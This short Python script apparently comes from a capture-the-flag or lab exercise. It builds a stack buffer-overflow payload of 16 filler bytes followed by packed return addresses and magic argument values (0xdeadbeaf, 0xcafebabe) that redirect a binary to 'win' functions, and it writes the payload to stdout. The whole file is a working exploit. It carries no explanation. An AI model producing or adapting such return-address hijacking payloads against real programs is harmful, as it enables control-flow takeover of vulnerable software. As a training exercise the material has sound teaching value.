import sys
from struct import pack

buf = b'a'*0x10

# win1
#buf += pack('<QQ', 0x00007fffffffdeb8, 0x4011ae)

#win2
buf += pack('<QQ', 0xdeadbeaf, 0x401283)
buf += pack('<Q', 0xcafebabe)
buf += pack('<Q', 0x4011d1)

sys.stdout.buffer.write(buf)
